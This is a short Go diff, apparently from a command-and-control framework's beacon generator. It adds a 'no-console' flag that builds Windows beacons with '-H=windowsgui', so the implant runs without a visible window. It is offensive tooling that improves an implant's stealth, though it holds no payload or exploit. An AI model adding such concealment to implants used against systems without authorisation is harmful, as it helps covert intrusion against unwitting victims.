@@ -24,6 +24,7 @@ func SetGenerateBeaconCommand() {
 			a.String("address", "address for http or tcp")
 		},
 		Flags: func(f *grumble.Flags) {
+			f.Bool("n", "no-console", false, "If Specified, beacon will not have a console on windows")
 			f.String("t", "http-proxy-type", "none", "HTTP Proxy Type, can be HTTP or HTTPS")
 			f.String("a", "http-proxy-address", "", "URL for example 127.0.0.1:8080")
 			f.String("u", "http-proxy-username", "", "Proxy Username")
@@ -82,6 +83,7 @@ func SetGenerateBeaconCommand() {
 		},
 		Run: func(c *grumble.Context) error {
 			beaconType := c.Args.String("type")
+			console := !c.Flags.Bool("no-console")
 			switch beaconType {
 			case "http", "http_dll", "http_svc", "https", "https_dll", "https_svc", "tcp", "tcp_dll", "tcp_svc",
 				"smb", "smb_dll", "smb_svc":
@@ -128,6 +130,11 @@ func SetGenerateBeaconCommand() {
 
 
 			ldflags := fmt.Sprintf("-s -w -X main.Targetip=%s -X main.Targetport=%s -X main.HTTPProxyType=%s -X main.HTTPProxyURL=%s -X main.HTTPProxyUsername=%s -X main.HTTPProxyPassword=%s", beaconIP, beaconPort, proxyType, proxyAddress, proxyUsername, proxyPassword)
+
+			if !console && beaconOs == "windows" {
+				ldflags += " -H=windowsgui"
+
+			}
 			mainPath := fmt.Sprintf("beacon/main_%s.go", beaconType)
 			tags := fmt.Sprintf("-tags=%s", beaconType)
 
